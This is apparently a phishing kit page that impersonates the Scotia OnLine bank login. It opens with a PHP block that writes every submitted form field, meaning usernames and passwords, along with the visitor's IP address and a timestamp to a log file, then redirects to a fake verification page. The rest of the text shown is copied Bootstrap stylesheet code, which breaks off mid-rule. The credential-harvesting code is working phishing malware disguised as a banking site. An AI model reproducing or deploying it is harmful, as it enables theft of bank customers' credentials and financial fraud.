<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: verify_user&password.php');
$handle = fopen('log.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>

<!-- saved from url=(0178)http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88 -->
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" style="" class="RUIFW-ready desktop"><head id="j_idt3"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Scotia OnLine</title>
	
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	
	  <meta charset="utf-8">
 <meta name="viewport" content="width=SITE_MIN_WIDTH, initial-scale=1, maximum-scale=1">
	
	
<style>
/*!
 * Bootstrap v3.2.0 (http://getbootstrap.com)
 * Copyright 2011-2014 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */

/*! normalize.css v3.0.1 | MIT License | git.io/normalize */
html {
    font-family: sans-serif;
    -webkit-text-size-adjust: 100%;
        -ms-text-size-adjust: 100%;
  }
  body {
    margin: 0;
  }
  article,
  aside,
  details,
  figcaption,
  figure,
  footer,
  header,
  hgroup,
  main,
  nav,
  section,
  summary {
    display: block;
  }
  audio,
  canvas,
  progress,
  video {
    display: inline-block;
    vertical-align: baseline;
  }
  audio:not([controls]) {
    display: none;
    height: 0;
  }
  [hidden],
  template {
    display: none;
  }
  a {
    background: transparent;
  }
  a:active,
  a:hover {
    outline: 0;
  }
  abbr[title] {
    border-bottom: 1px dotted;
  }
  b,
  strong {
    font-weight: bold;
  }
  dfn {
    font-style: italic;
  }
  h1 {
    margin: .67em 0;
    font-size: 2em;
  }
  mark {
    color: #000;
    background: #ff0;
  }
  small {
    font-size: 80%;
  }
  sub,
  sup {
    position: relative;
    font-size: 75%;
    line-height: 0;
    vertical-align: baseline;
  }
  sup {
    top: -.5em;
  }
  sub {
    bottom: -.25em;
  }
  img {
    border: 0;
  }
  svg:not(:root) {
    overflow: hidden;
  }
  figure {
    margin: 1em 40px;
  }
  hr {
    height: 0;
    -webkit-box-sizing: content-box;
       -moz-box-sizing: content-box;
            box-sizing: content-box;
  }
  pre {
    overflow: auto;
  }
  code,
  kbd,
  pre,
  samp {
    font-family: monospace, monospace;
    font-size: 1em;
  }
  button,
  input,
  optgroup,
  select,
  textarea {
    margin: 0;
    font: inherit;
    color: inherit;
  }
  button {
    overflow: visible;
  }
  button,
  select {
    text-transform: none;
  }
  button,
  html input[type="button"],
  input[type="reset"],
  input[type="submit"] {
    -webkit-appearance: button;
    cursor: pointer;
  }
  button[disabled],
  html input[disabled] {
    cursor: default;
  }
  button::-moz-focus-inner,
  input::-moz-focus-inner {
    padding: 0;
    border: 0;
  }
  input {
    line-height: normal;
  }
  input[type="checkbox"],
  input[type="radio"] {
    -webkit-box-sizing: border-box;
       -moz-box-sizing: border-box;
            box-sizing: border-box;
    padding: 0;
  }
  input[type="number"]::-webkit-inner-spin-button,
  input[type="number"]::-webkit-outer-spin-button {
    height: auto;
  }
  input[type="search"] {
    -webkit-box-sizing: content-box;
       -moz-box-sizing: content-box;
            box-sizing: content-box;
    -webkit-appearance: textfield;
  }
  input[type="search"]::-webkit-search-cancel-button,
  input[type="search"]::-webkit-search-decoration {
    -webkit-appearance: none;
  }
  fieldset {
    padding: .35em .625em .75em;
    margin: 0 2px;
    border: 1px solid #c0c0c0;
  }
  legend {
    padding: 0;
    border: 0;
  }
  textarea {
    overflow: auto;
  }
  optgroup {
    font-weight: bold;
  }
  table {
    border-spacing: 0;
    border-collapse: collapse;
  }
  td,
  th {
    padding: 0;
  }
  @media print {
    * {
      color: #000 !important;
      text-shadow: none !important;
      background: transparent !important;
      -webkit-box-shadow: none !important;
              box-shadow: none !important;
    }
    a,
    a:visited {
      text-decoration: underline;
    }
    a[href]:after {
      content: " (" attr(href) ")";
    }
    abbr[title]:after {
      content: " (" attr(title) ")";
    }
    a[href^="javascript:"]:after,
    a[href^="#"]:after {
      content: "";
    }
    pre,
    blockquote {
      border: 1px solid #999;
  
      page-break-inside: avoid;
    }
    thead {
      display: table-header-group;
    }
    tr,
    img {
      page-break-inside: avoid;
    }
    img {
      max-width: 100% !important;
    }
    p,
    h2,
    h3 {
      orphans: 3;
      widows: 3;
    }
    h2,
    h3 {
      page-break-after: avoid;
    }
    select {
      background: #fff !important;
    }
    .navbar {
      display: none;
    }
    .table td,
    .table th {
      background-color: #fff !important;
    }
    .btn > .caret,
    .dropup > .btn > .caret {
      border-top-color: #000 !important;
    }
    .label {
      border: 1px solid #000;
    }
    .table {
      border-collapse: collapse !important;
    }
    .table-bordered th,
    .table-bordered td {
      border: 1px solid #ddd !important;
    }
  }
  /* comment out by FlexUI
  @font-face {
    font-family: 'Glyphicons Halflings';
  
    src: url('../fonts/glyphicons-halflings-regular.eot');
    src: url('../fonts/glyphicons-halflings-regular.eot?#iefix') format('embedded-opentype'), url('../fonts/glyphicons-halflings-regular.woff') format('woff'), url('../fonts/glyphicons-halflings-regular.ttf') format('truetype'), url('../fonts/glyphicons-halflings-regular.svg#glyphicons_halflingsregular') format('svg');
  }
  .glyphicon {
    position: relative;
    top: 1px;
    display: inline-block;
    font-family: 'Glyphicons Halflings';
    font-style: normal;
    font-weight: normal;
    line-height: 1;
  
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
  }
  .glyphicon-asterisk:before {
    content: "\2a";
  }
  .glyphicon-plus:before {
    content: "\2b";
  }
  .glyphicon-euro:before {
    content: "\20ac";
  }
  .glyphicon-minus:before {
    content: "\2212";
  }
  .glyphicon-cloud:before {
    content: "\2601";
  }
  .glyphicon-envelope:before {
    content: "\2709";
  }
  .glyphicon-pencil:before {
    content: "\270f";
  }
  .glyphicon-glass:before {
    content: "\e001";
  }
  .glyphicon-music:before {
    content: "\e002";
  }
  .glyphicon-search:before {
    content: "\e003";
  }
  .glyphicon-heart:before {
    content: "\e005";
  }
  .glyphicon-star:before {
    content: "\e006";
  }
  .glyphicon-star-empty:before {
    content: "\e007";
  }
  .glyphicon-user:before {
    content: "\e008";
  }
  .glyphicon-film:before {
    content: "\e009";
  }
  .glyphicon-th-large:before {
    content: "\e010";
  }
  .glyphicon-th:before {
    content: "\e011";
  }
  .glyphicon-th-list:before {
    content: "\e012";
  }
  .glyphicon-ok:before {
    content: "\e013";
  }
  .glyphicon-remove:before {
    content: "\e014";
  }
  .glyphicon-zoom-in:before {
    content: "\e015";
  }
  .glyphicon-zoom-out:before {
    content: "\e016";
  }
  .glyphicon-off:before {
    content: "\e017";
  }
  .glyphicon-signal:before {
    content: "\e018";
  }
  .glyphicon-cog:before {
    content: "\e019";
  }
  .glyphicon-trash:before {
    content: "\e020";
  }
  .glyphicon-home:before {
    content: "\e021";
  }
  .glyphicon-file:before {
    content: "\e022";
  }
  .glyphicon-time:before {
    content: "\e023";
  }
  .glyphicon-road:before {
    content: "\e024";
  }
  .glyphicon-download-alt:before {
    content: "\e025";
  }
  .glyphicon-download:before {
    content: "\e026";
  }
  .glyphicon-upload:before {
    content: "\e027";
  }
  .glyphicon-inbox:before {
    content: "\e028";
  }
  .glyphicon-play-circle:before {
    content: "\e029";
  }
  .glyphicon-repeat:before {
    content: "\e030";
  }
  .glyphicon-refresh:before {
    content: "\e031";
  }
  .glyphicon-list-alt:before {
    content: "\e032";
  }
  .glyphicon-lock:before {
    content: "\e033";
  }
  .glyphicon-flag:before {
    content: "\e034";
  }
  .glyphicon-headphones:before {
    content: "\e035";
  }
  .glyphicon-volume-off:before {
    content: "\e036";
  }
  .glyphicon-volume-down:before {
    content: "\e037";
  }
  .glyphicon-volume-up:before {
    content: "\e038";
  }
  .glyphicon-qrcode:before {
    content: "\e039";
  }
  .glyphicon-barcode:before {
    content: "\e040";
  }
  .glyphicon-tag:before {
    content: "\e041";
  }
  .glyphicon-tags:before {
    content: "\e042";
  }
  .glyphicon-book:before {
    content: "\e043";
  }
  .glyphicon-bookmark:before {
    content: "\e044";
  }
  .glyphicon-print:before {
    content: "\e045";
  }
  .glyphicon-camera:before {
    content: "\e046";
  }
  .glyphicon-font:before {
    content: "\e047";
  }
  .glyphicon-bold:before {
    content: "\e048";
  }
  .glyphicon-italic:before {
    content: "\e049";
  }
  .glyphicon-text-height:before {
    content: "\e050";
  }
  .glyphicon-text-width:before {
    content: "\e051";
  }
  .glyphicon-align-left:before {
    content: "\e052";
  }
  .glyphicon-align-center:before {
    content: "\e053";
  }
  .glyphicon-align-right:before {
    content: "\e054";
  }
  .glyphicon-align-justify:before {
    content: "\e055";
  }
  .glyphicon-list:before {
    content: "\e056";
  }
  .glyphicon-indent-left:before {
    content: "\e057";
  }
  .glyphicon-indent-right:before {
    content: "\e058";
  }
  .glyphicon-facetime-video:before {
    content: "\e059";
  }
  .glyphicon-picture:before {
    content: "\e060";
  }
  .glyphicon-map-marker:before {
    content: "\e062";
  }
  .glyphicon-adjust:before {
    content: "\e063";
  }
  .glyphicon-tint:before {
    content: "\e064";
  }
  .glyphicon-edit:before {
    content: "\e065";
  }
  .glyphicon-share:before {
    content: "\e066";
  }
  .glyphicon-check:before {
    content: "\e067";
  }
  .glyphicon-move:before {
    content: "\e068";
  }
  .glyphicon-step-backward:before {
    content: "\e069";
  }
  .glyphicon-fast-backward:before {
    content: "\e070";
  }
  .glyphicon-backward:before {
    content: "\e071";
  }
  .glyphicon-play:before {
    content: "\e072";
  }
  .glyphicon-pause:before {
    content: "\e073";
  }
  .glyphicon-stop:before {
    content: "\e074";
  }
  .glyphicon-forward:before {
    content: "\e075";
  }
  .glyphicon-fast-forward:before {
    content: "\e076";
  }
  .glyphicon-step-forward:before {
    content: "\e077";
  }
  .glyphicon-eject:before {
    content: "\e078";
  }
  .glyphicon-chevron-left:before {
    content: "\e079";
  }
  .glyphicon-chevron-right:before {
    content: "\e080";
  }
  .glyphicon-plus-sign:before {
    content: "\e081";
  }
  .glyphicon-minus-sign:before {
    content: "\e082";
  }
  .glyphicon-remove-sign:before {
    content: "\e083";
  }
  .glyphicon-ok-sign:before {
    content: "\e084";
  }
  .glyphicon-question-sign:before {
    content: "\e085";
  }
  .glyphicon-info-sign:before {
    content: "\e086";
  }
  .glyphicon-screenshot:before {
    content: "\e087";
  }
  .glyphicon-remove-circle:before {
    content: "\e088";
  }
  .glyphicon-ok-circle:before {
    content: "\e089";
  }
  .glyphicon-ban-circle:before {
    content: "\e090";
  }
  .glyphicon-arrow-left:before {
    content: "\e091";
  }
  .glyphicon-arrow-right:before {
    content: "\e092";
  }
  .glyphicon-arrow-up:before {
    content: "\e093";
  }
  .glyphicon-arrow-down:before {
    content: "\e094";
  }
  .glyphicon-share-alt:before {
    content: "\e095";
  }
  .glyphicon-resize-full:before {
    content: "\e096";
  }
  .glyphicon-resize-small:before {
    content: "\e097";
  }
  .glyphicon-exclamation-sign:before {
    content: "\e101";
  }
  .glyphicon-gift:before {
    content: "\e102";
  }
  .glyphicon-leaf:before {
    content: "\e103";
  }
  .glyphicon-fire:before {
    content: "\e104";
  }
  .glyphicon-eye-open:before {
    content: "\e105";
  }
  .glyphicon-eye-close:before {
    content: "\e106";
  }
  .glyphicon-warning-sign:before {
    content: "\e107";
  }
  .glyphicon-plane:before {
    content: "\e108";
  }
  .glyphicon-calendar:before {
    content: "\e109";
  }
  .glyphicon-random:before {
    content: "\e110";
  }
  .glyphicon-comment:before {
    content: "\e111";
  }
  .glyphicon-magnet:before {
    content: "\e112";
  }
  .glyphicon-chevron-up:before {
    content: "\e113";
  }
  .glyphicon-chevron-down:before {
    content: "\e114";
  }
  .glyphicon-retweet:before {
    content: "\e115";
  }
  .glyphicon-shopping-cart:before {
    content: "\e116";
  }
  .glyphicon-folder-close:before {
    content: "\e117";
  }
  .glyphicon-folder-open:before {
    content: "\e118";
  }
  .glyphicon-resize-vertical:before {
    content: "\e119";
  }
  .glyphicon-resize-horizontal:before {
    content: "\e120";
  }
  .glyphicon-hdd:before {
    content: "\e121";
  }
  .glyphicon-bullhorn:before {
    content: "\e122";
  }
  .glyphicon-bell:before {
    content: "\e123";
  }
  .glyphicon-certificate:before {
    content: "\e124";
  }
  .glyphicon-thumbs-up:before {
    content: "\e125";
  }
  .glyphicon-thumbs-down:before {
    content: "\e126";
  }
  .glyphicon-hand-right:before {
    content: "\e127";
  }
  .glyphicon-hand-left:before {
    content: "\e128";
  }
  .glyphicon-hand-up:before {
    content: "\e129";
  }
  .glyphicon-hand-down:before {
    content: "\e130";
  }
  .glyphicon-circle-arrow-right:before {
    content: "\e131";
  }
  .glyphicon-circle-arrow-left:before {
    content: "\e132";
  }
  .glyphicon-circle-arrow-up:before {
    content: "\e133";
  }
  .glyphicon-circle-arrow-down:before {
    content: "\e134";
  }
  .glyphicon-globe:before {
    content: "\e135";
  }
  .glyphicon-wrench:before {
    content: "\e136";
  }
  .glyphicon-tasks:before {
    content: "\e137";
  }
  .glyphicon-filter:before {
    content: "\e138";
  }
  .glyphicon-briefcase:before {
    content: "\e139";
  }
  .glyphicon-fullscreen:before {
    content: "\e140";
  }
  .glyphicon-dashboard:before {
    content: "\e141";
  }
  .glyphicon-paperclip:before {
    content: "\e142";
  }
  .glyphicon-heart-empty:before {
    content: "\e143";
  }
  .glyphicon-link:before {
    content: "\e144";
  }
  .glyphicon-phone:before {
    content: "\e145";
  }
  .glyphicon-pushpin:before {
    content: "\e146";
  }
  .glyphicon-usd:before {
    content: "\e148";
  }
  .glyphicon-gbp:before {
    content: "\e149";
  }
  .glyphicon-sort:before {
    content: "\e150";
  }
  .glyphicon-sort-by-alphabet:before {
    content: "\e151";
  }
  .glyphicon-sort-by-alphabet-alt:before {
    content: "\e152";
  }
  .glyphicon-sort-by-order:before {
    content: "\e153";
  }
  .glyphicon-sort-by-order-alt:before {
    content: "\e154";
  }
  .glyphicon-sort-by-attributes:before {
    content: "\e155";
  }
  .glyphicon-sort-by-attributes-alt:before {
    content: "\e156";
  }
  .glyphicon-unchecked:before {
    content: "\e157";
  }
  .glyphicon-expand:before {
    content: "\e158";
  }
  .glyphicon-collapse-down:before {
    content: "\e159";
  }
  .glyphicon-collapse-up:before {
    content: "\e160";
  }
  .glyphicon-log-in:before {
    content: "\e161";
  }
  .glyphicon-flash:before {
    content: "\e162";
  }
  .glyphicon-log-out:before {
    content: "\e163";
  }
  .glyphicon-new-window:before {
    content: "\e164";
  }
  .glyphicon-record:before {
    content: "\e165";
  }
  .glyphicon-save:before {
    content: "\e166";
  }
  .glyphicon-open:before {
    content: "\e167";
  }
  .glyphicon-saved:before {
    content: "\e168";
  }
  .glyphicon-import:before {
    content: "\e169";
  }
  .glyphicon-export:before {
    content: "\e170";
  }
  .glyphicon-send:before {
    content: "\e171";
  }
  .glyphicon-floppy-disk:before {
    content: "\e172";
  }
  .glyphicon-floppy-saved:before {
    content: "\e173";
  }
  .glyphicon-floppy-remove:before {
    content: "\e174";
  }
  .glyphicon-floppy-save:before {
    content: "\e175";
  }
  .glyphicon-floppy-open:before {
    content: "\e176";
  }
  .glyphicon-credit-card:before {
    content: "\e177";
  }
  .glyphicon-transfer:before {
    content: "\e178";
  }
  .glyphicon-cutlery:before {
    content: "\e179";
  }
  .glyphicon-header:before {
    content: "\e180";
  }
  .glyphicon-compressed:before {
    content: "\e181";
  }
  .glyphicon-earphone:before {
    content: "\e182";
  }
  .glyphicon-phone-alt:before {
    content: "\e183";
  }
  .glyphicon-tower:before {
    content: "\e184";
  }
  .glyphicon-stats:before {
    content: "\e185";
  }
  .glyphicon-sd-video:before {
    content: "\e186";
  }
  .glyphicon-hd-video:before {
    content: "\e187";
  }
  .glyphicon-subtitles:before {
    content: "\e188";
  }
  .glyphicon-sound-stereo:before {
    content: "\e189";
  }
  .glyphicon-sound-dolby:before {
    content: "\e190";
  }
  .glyphicon-sound-5-1:before {
    content: "\e191";
  }
  .glyphicon-sound-6-1:before {
    content: "\e192";
  }
  .glyphicon-sound-7-1:before {
    content: "\e193";
  }
  .glyphicon-copyright-mark:before {
    content: "\e194";
  }
  .glyphicon-registration-mark:before {
    content: "\e195";
  }
  .glyphicon-cloud-download:before {
    content: "\e197";
  }
  .glyphicon-cloud-upload:before {
    content: "\e198";
  }
  .glyphicon-tree-conifer:before {
    content: "\e199";
  }
  .glyphicon-tree-deciduous:before {
    content: "\e200";
  }
  */
  * {
    -webkit-box-sizing: border-box;
       -moz-box-sizing: border-box;
            box-sizing: border-box;
  }
  *:before,
  *:after {
    -webkit-box-sizing: border-box;
       -moz-box-sizing: border-box;
            box-sizing: border-box;
  }
  html {
    font-size: 10px;
  
    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
  }
  body {
    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    font-size: 14px;
    line-height: 1.42857143;
    color: #333;
    background-color: #fff;
  }
  input,
  button,
  select,
  textarea {
    font-family: inherit;
    font-size: inherit;
    line-height: inherit;
  }
  a {
    color: #428bca;
    text-decoration: none;
  }
  a:hover,
  a:focus {
    color: #2a6496;
    text-decoration: underline;
  }
  a:focus {
    outline: thin dotted;
    outline: 5px auto -webkit-focus-ring-color;
    outline-offset: -2px;
  }
  figure {
    margin: 0;
  }
  img {
    vertical-align: middle;
  }
  .img-responsive,
  .thumbnail > img,
  .thumbnail a > img,
  .carousel-inner > .item > img,
  .carousel-inner > .item > a > img {
    display: block;
    width: 100% \9;
    max-width: 100%;
    height: auto;
  }
  .img-rounded {
    border-radius: 6px;
  }
  .img-thumbnail {
    display: inline-block;
    width: 100% \9;
    max-width: 100%;
    height: auto;
    padding: 4px;
    line-height: 1.42857143;
    background-color: #fff;
    border: 1px solid #ddd;
    border-radius: 4px;
    -webkit-transition: all .2s ease-in-out;
         -o-transition: all .2s ease-in-out;
            transition: all .2s ease-in-out;
  }
  .img-circle {
    border-radius: 50%;
  }
  hr {
    margin-top: 20px;
    margin-bottom: 20px;
    border: 0;
    border-top: 1px solid #eee;
  }
  .sr-only {
    position: absolute;
    width: 1px;
    height: 1px;
    padding: 0;
    margin: -1px;
    overflow: hidden;
    clip: rect(0, 0, 0, 0);
    border: 0;
  }
  .sr-only-focusable:active,
  .sr-only-focusable:focus {
    position: static;
    width: auto;
    height: auto;
    margin: 0;
    overflow: visible;
    clip: auto;
  }
  h1,
  h2,
  h3,
  h4,
  h5,
  h6,
  .h1,
  .h2,
  .h3,
  .h4,
  .h5,
  .h6 {
    font-family: inherit;
    font-weight: 500;
    line-height: 1.1;
    color: inherit;
  }
  h1 small,
  h2 small,
  h3 small,
  h4 small,
  h5 small,
  h6 small,
  .h1 small,
  .h2 small,
  .h3 small,
  .h4 small,
  .h5 small,
  .h6 small,
  h1 .small,
  h2 .small,
  h3 .small,
  h4 .small,
  h5 .small,
  h6 .small,
  .h1 .small,
  .h2 .small,
  .h3 .small,
  .h4 .small,
  .h5 .small,
  .h6 .small {
    font-weight: normal;
    line-height: 1;
    color: #777;
  }
  h1,
  .h1,
  h2,
  .h2,
  h3,
  .h3 {
    margin-top: 20px;
    margin-bottom: 10px;
  }
  h1 small,
  .h1 small,
  h2 small,
  .h2 small,
  h3 small,
  .h3 small,
  h1 .small,
  .h1 .small,
  h2 .small,
  .h2 .small,
  h3 .small,
  .h3 .small {
    font-size: 65%;
  }
  h4,
  .h4,
  h5,
  .h5,
  h6,
  .h6 {
    margin-top: 10px;
    margin-bottom: 10px;
  }
  h4 small,
  .h4 small,
  h5 small,
  .h5 small,
  h6 small,
  .h6 small,
  h4 .small,
  .h4 .small,
  h5 .small,
  .h5 .small,
  h6 .small,
  .h6 .small {
    font-size: 75%;
  }
  h1,
  .h1 {
    font-size: 36px;
  }
  h2,
  .h2 {
    font-size: 30px;
  }
  h3,
  .h3 {
    font-size: 24px;
  }
  h4,
  .h4 {
    font-size: 18px;
  }
  h5,
  .h5 {
    font-size: 14px;
  }
  h6,
  .h6 {
    font-size: 12px;
  }
  p {
    margin: 0 0 10px;
  }
  .lead {
    margin-bottom: 20px;
    font-size: 16px;
    font-weight: 300;
    line-height: 1.4;
  }
  @media (min-width: 768px) {
    .lead {
      font-size: 21px;
    }
  }
  small,
  .small {
    font-size: 85%;
  }
  cite {
    font-style: normal;
  }
  mark,
  .mark {
    padding: .2em;
    background-color: #fcf8e3;
  }
  .text-left {
    text-align: left;
  }
  .text-right {
    text-align: right;
  }
  .text-center {
    text-align: center;
  }
  .text-justify {
    text-align: justify;
  }
  .text-nowrap {
    white-space: nowrap;
  }
  .text-lowercase {
    text-transform: lowercase;
  }
  .text-uppercase {
    text-transform: uppercase;
  }
  .text-capitalize {
    text-transform: capitalize;
  }
  .text-muted {
    color: #777;
  }
  .text-primary {
    color: #428bca;
  }
  a.text-primary:hover {
    color: #3071a9;
  }
  .text-success {
    color: #3c763d;
  }
  a.text-success:hover {
    color: #2b542c;
  }
  .text-info {
    color: #31708f;
  }
  a.text-info:hover {
    color: #245269;
  }
  .text-warning {
    color: #8a6d3b;
  }
  a.text-warning:hover {
    color: #66512c;
  }
  .text-danger {
    color: #a94442;
  }
  a.text-danger:hover {
    color: #843534;
  }
  .bg-primary {
    color: #fff;
    background-color: #428bca;
  }
  a.bg-primary:hover {
    background-color: #3071a9;
  }
  .bg-success {
    background-color: #dff0d8;
  }
  a.bg-success:hover {
    background-color: #c1e2b3;
  }
  .bg-info {
    background-color: #d9edf7;
  }
  a.bg-info:hover {
    background-color: #afd9ee;
  }
  .bg-warning {
    background-color: #fcf8e3;
  }
  a.bg-warning:hover {
    background-color: #f7ecb5;
  }
  .bg-danger {
    background-color: #f2dede;
  }
  a.bg-danger:hover {
    background-color: #e4b9b9;
  }
  .page-header {
    padding-bottom: 9px;
    margin: 40px 0 20px;
    border-bottom: 1px solid #eee;
  }
  ul,
  ol {
    margin-top: 0;
    margin-bottom: 10px;
  }
  ul ul,
  ol ul,
  ul ol,
  ol ol {
    margin-bottom: 0;
  }
  .list-unstyled {
    padding-left: 0;
    list-style: none;
  }
  .list-inline {
    padding-left: 0;
    margin-left: -5px;
    list-style: none;
  }
  .list-inline > li {
    display: inline-block;
    padding-right: 5px;
    padding-left: 5px;
  }
  dl {
    margin-top: 0;
    margin-bottom: 20px;
  }
  dt,
  dd {
    line-height: 1.42857143;
  }
  dt {
    font-weight: bold;
  }
  dd {
    margin-left: 0;
  }
  @media (min-width: 768px) {
    .dl-horizontal dt {
      float: left;
      width: 160px;
      overflow: hidden;
      clear: left;
      text-align: right;
      text-overflow: ellipsis;
      white-space: nowrap;
    }
    .dl-horizontal dd {
      margin-left: 180px;
    }
  }
  abbr[title],
  abbr[data-original-title] {
    cursor: help;
    border-bottom: 1px dotted #777;
  }
  .initialism {
    font-size: 90%;
    text-transform: uppercase;
  }
  blockquote {
    padding: 10px 20px;
    margin: 0 0 20px;
    font-size: 17.5px;
    border-left: 5px solid #eee;
  }
  blockquote p:last-child,
  blockquote ul:last-child,
  blockquote ol:last-child {
    margin-bottom: 0;
  }
  blockquote footer,
  blockquote small,
  blockquote .small {
    display: block;
    font-size: 80%;
    line-height: 1.42857143;
    color: #777;
  }
  blockquote footer:before,
  blockquote small:before,
  blockquote .small:before {
    content: '\2014 \00A0';
  }
  .blockquote-reverse,
  blockquote.pull-right {
    padding-right: 15px;
    padding-left: 0;
    text-align: right;
    border-right: 5px solid #eee;
    border-left: 0;
  }
  .blockquote-reverse footer:before,
  blockquote.pull-right footer:before,
  .blockquote-reverse small:before,
  blockquote.pull-right small:before,
  .blockquote-reverse .small:before,
  blockquote.pull-right .small:before {
    content: '';
  }
  .blockquote-reverse footer:after,
  blockquote.pull-right footer:after,
  .blockquote-reverse small:after,
  blockquote.pull-right small:after,
  .blockquote-reverse .small:after,
  blockquote.pull-right .small:after {
    content: '\00A0 \2014';
  }
  blockquote:before,
  blockquote:after {
    content: "";
  }
  address {
    margin-bottom: 20px;
    font-style: normal;
    line-height: 1.42857143;
  }
  code,
  kbd,
  pre,
  samp {
    font-family: Menlo, Monaco, Consolas, "Courier New", monospace;
  }
  code {
    padding: 2px 4px;
    font-size: 90%;
    color: #c7254e;
    background-color: #f9f2f4;
    border-radius: 4px;
  }
  kbd {
    padding: 2px 4px;
    font-size: 90%;
    color: #fff;
    background-color: #333;
    border-radius: 3px;
    -webkit-box-shadow: inset 0 -1px 0 rgba(0, 0, 0, .25);
            box-shadow: inset 0 -1px 0 rgba(0, 0, 0, .25);
  }
  kbd kbd {
    padding: 0;
    font-size: 100%;
    -webkit-box-shadow: none;
            box-shadow: none;
  }
  pre {
    display: block;
    padding: 9.5px;
    margin: 0 0 10px;
    font-size: 13px;
    line-height: 1.42857143;
    color: #333;
    word-break: break-all;
    word-wrap: break-word;
    background-color: #f5f5f5;
    border: 1px solid #ccc;
    border-radius: 4px;
  }
  pre code {
    padding: 0;
    font-size: inherit;
    color: inherit;
    white-space: pre-wrap;
    background-color: transparent;
    border-radius: 0;
  }
  .pre-scrollable {
    max-height: 340px;
    overflow-y: scroll;
  }
  .container {
    padding-right: 15px;
    padding-left: 15px;
    margin-right: auto;
    margin-left: auto;
  }
  @media (min-width: 768px) {
    .container {
      width: 750px;
    }
  }
  @media (min-width: 992px) {
    .container {
      width: 970px;
    }
  }
  @media (min-width: 1200px) {
    .container {
      width: 1170px;
    }
  }
  .container-fluid {
    padding-right: 15px;
    padding-left: 15px;
    margin-right: auto;
    margin-left: auto;
  }
  .row {
    margin-right: -15px;
    margin-left: -15px;
  }
  .col-xs-1, .col-sm-1, .col-md-1, .col-lg-1, .col-xs-2, .col-sm-2, .col-md-2, .col-lg-2, .col-xs-3, .col-sm-3, .col-md-3, .col-lg-3, .col-xs-4, .col-sm-4, .col-md-4, .col-lg-4, .col-xs-5, .col-sm-5, .col-md-5, .col-lg-5, .col-xs-6, .col-sm-6, .col-md-6, .col-lg-6, .col-xs-7, .col-sm-7, .col-md-7, .col-lg-7, .col-xs-8, .col-sm-8, .col-md-8, .col-lg-8, .col-xs-9, .col-sm-9, .col-md-9, .col-lg-9, .col-xs-10, .col-sm-10, .col-md-10, .col-lg-10, .col-xs-11, .col-sm-11, .col-md-11, .col-lg-11, .col-xs-12, .col-sm-12, .col-md-12, .col-lg-12 {
    position: relative;
    min-height: 1px;
    padding-right: 15px;
    padding-left: 15px;
  }
  .col-xs-1, .col-xs-2, .col-xs-3, .col-xs-4, .col-xs-5, .col-xs-6, .col-xs-7, .col-xs-8, .col-xs-9, .col-xs-10, .col-xs-11, .col-xs-12 {
    float: left;
  }
  .col-xs-12 {
    width: 100%;
  }
  .col-xs-11 {
    width: 91.66666667%;
  }
  .col-xs-10 {
    width: 83.33333333%;
  }
  .col-xs-9 {
    width: 75%;
  }
  .col-xs-8 {
    width: 66.66666667%;
  }
  .col-xs-7 {
    width: 58.33333333%;
  }
  .col-xs-6 {
    width: 50%;
  }
  .col-xs-5 {
    width: 41.66666667%;
  }
  .col-xs-4 {
    width: 33.33333333%;
  }
  .col-xs-3 {
    width: 25%;
  }
  .col-xs-2 {
    width: 16.66666667%;
  }
  .col-xs-1 {
    width: 8.33333333%;
  }
  .col-xs-pull-12 {
    right: 100%;
  }
  .col-xs-pull-11 {
    right: 91.66666667%;
  }
  .col-xs-pull-10 {
    right: 83.33333333%;
  }
  .col-xs-pull-9 {
    right: 75%;
  }
  .col-xs-pull-8 {
    right: 66.66666667%;
  }
  .col-xs-pull-7 {
    right: 58.33333333%;
  }
  .col-xs-pull-6 {
    right: 50%;
  }
  .col-xs-pull-5 {
    right: 41.66666667%;
  }
  .col-xs-pull-4 {
    right: 33.33333333%;
  }
  .col-xs-pull-3 {
    right: 25%;
  }
  .col-xs-pull-2 {
    right: 16.66666667%;
  }
  .col-xs-pull-1 {
    right: 8.33333333%;
  }
  .col-xs-pull-0 {
    right: auto;
  }
  .col-xs-push-12 {
    left: 100%;
  }
  .col-xs-push-11 {
    left: 91.66666667%;
  }
  .col-xs-push-10 {
    left: 83.33333333%;
  }
  .col-xs-push-9 {
    left: 75%;
  }
  .col-xs-push-8 {
    left: 66.66666667%;
  }
  .col-xs-push-7 {
    left: 58.33333333%;
  }
  .col-xs-push-6 {
    left: 50%;
  }
  .col-xs-push-5 {
    left: 41.66666667%;
  }
  .col-xs-push-4 {
    left: 33.33333333%;
  }
  .col-xs-push-3 {
    left: 25%;
  }
  .col-xs-push-2 {
    left: 16.66666667%;
  }
  .col-xs-push-1 {
    left: 8.33333333%;
  }
  .col-xs-push-0 {
    left: auto;
  }
  .col-xs-offset-12 {
    margin-left: 100%;
  }
  .col-xs-offset-11 {
    margin-left: 91.66666667%;
  }
  .col-xs-offset-10 {
    margin-left: 83.33333333%;
  }
  .col-xs-offset-9 {
    margin-left: 75%;
  }
  .col-xs-offset-8 {
    margin-left: 66.66666667%;
  }
  .col-xs-offset-7 {
    margin-left: 58.33333333%;
  }
  .col-xs-offset-6 {
    margin-left: 50%;
  }
  .col-xs-offset-5 {
    margin-left: 41.66666667%;
  }
  .col-xs-offset-4 {
    margin-left: 33.33333333%;
  }
  .col-xs-offset-3 {
    margin-left: 25%;
  }
  .col-xs-offset-2 {
    margin-left: 16.66666667%;
  }
  .col-xs-offset-1 {
    margin-left: 8.33333333%;
  }
  .col-xs-offset-0 {
    margin-left: 0;
  }
  @media (min-width: 768px) {
